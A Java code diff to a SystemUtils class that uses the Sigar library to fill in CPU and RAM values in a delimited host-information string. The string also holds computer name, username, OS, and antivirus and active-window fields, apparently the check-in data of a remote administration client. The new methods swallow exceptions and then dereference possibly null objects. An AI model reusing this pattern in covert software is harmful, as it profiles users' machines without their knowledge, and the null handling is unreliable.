@@ -7,6 +7,7 @@ package ccsurat.jclient;
 
 import java.util.UUID;
 import java.net.InetAddress;
+import org.hyperic.sigar.*;
 
 /**
  *
@@ -22,7 +23,7 @@ public class SystemUtils {
         info += getComputerName() + "|*|";
         info += getUsername() + "|*|";
         info += getOS() + "|*|";
-        info += "CPU" + "|*|";
+        info += getCPU() + "|*|";
         info += getRAM() + "|*|";
         info += "AV" + "|*|";
         info += "ActiveWindow" + "|*|";
@@ -36,7 +37,14 @@ public class SystemUtils {
     
     private static String getRAM()
     {
-        return Runtime.getRuntime().maxMemory() + "";
+        Mem mem = null;
+        try{ 
+            Sigar sigar = new Sigar();
+            mem = sigar.getMem();
+        } catch(Exception ex)
+        {
+        }
+        return (mem.getRam() / 1000) + " GB";
     }
     
     private static String getOS()
@@ -60,4 +68,18 @@ public class SystemUtils {
         return pcName;
     }
     
+    private static String getCPU()
+    {   
+        CpuInfo[] cpuInfoList = null;
+        try{ 
+            Sigar sigar = new Sigar();
+            cpuInfoList = sigar.getCpuInfoList();
+        } catch(Exception ex)
+        {
+        }
+        for(org.hyperic.sigar.CpuInfo info : cpuInfoList){
+            return info.getVendor() + " " + info.getModel();
+        }
+        return "Not Found";
+    }
 }
